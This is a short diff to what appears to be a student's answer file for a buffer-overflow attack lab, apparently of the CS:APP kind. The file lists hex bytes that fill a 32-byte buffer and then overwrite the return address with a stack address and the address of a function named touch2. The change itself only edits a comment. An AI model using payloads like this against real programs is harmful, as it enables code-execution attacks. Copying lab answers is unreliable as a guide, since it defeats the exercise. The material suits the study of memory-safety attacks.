@@ -3,7 +3,7 @@ FF FF FF FF FF FF FF FF  /*  32 byte buffer  */
 FF FF FF FF FF FF FF FF  /*  buffer  */ 
 FF FF FF FF FF FF FF FF  /*  buffer  */
 FF FF FF FF FF FF FF FF  /*  buffer  */ 
-78 DC 61 55 00 00 00 00  /*  mem address of $RSP after func Gets is called (contains overflow string)  */ 
+78 DC 61 55 00 00 00 00  /*  mem address of $RSP after func Gets is called */ 
 78 DC 61 55 00 00 00 00  /*  loading $RSP twice? */
 EC 17 40 00 00 00 00 00  /*  touch2 address  */ 
 
